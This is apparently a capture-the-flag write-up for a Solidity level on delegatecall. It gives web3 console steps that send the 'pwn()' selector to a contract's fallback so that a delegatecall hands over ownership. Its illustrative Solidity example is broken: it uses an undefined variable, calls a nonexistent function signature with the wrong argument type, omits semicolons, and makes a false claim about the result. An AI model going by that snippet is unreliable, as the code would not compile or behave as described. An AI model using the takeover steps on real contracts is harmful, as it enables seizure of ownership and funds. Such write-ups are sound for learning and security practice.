"Things that might help" alludes to alludes to `delegatecall`. What `delegatecall` (a lower level function) allows us to do, is we can call another contract's function while retaining our calling function's context.

Example:
```javascript
contract A {
    string name = "beef";
    function updateName (string _newName) public payable { 
        name = newName; 
        }
}

contract B {
    string name = "el stupido"
    
    // contract needs to be the address of contract A
    function updateName(address _contract) public payable {
        string compliment = "el inteligente"
        // if we run this, name is now "el inteligente"
        (bool success, bytes memory data) = _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", compliment)
        );
    }
}
```

## Solution
1. We grab the method that we're going to want to `delegatecall` (it's the one called `pwn` - duh)
```javascript 
> var methodId = web3.sha3('pwn()').substring(0,10);
```
2. Then we can see that our contract's fallback function, if triggered, will try to call a method from the `Delegate` contract. This method is the payload of the `delegatecall` (`msg.data`). So, we trigger this fallback with the `methodId` from step 1.
```javascript
> contract.sendTransaction({ data: methodId })
```
3. Finally, check ownership
```javascript
await contract.owner()
```
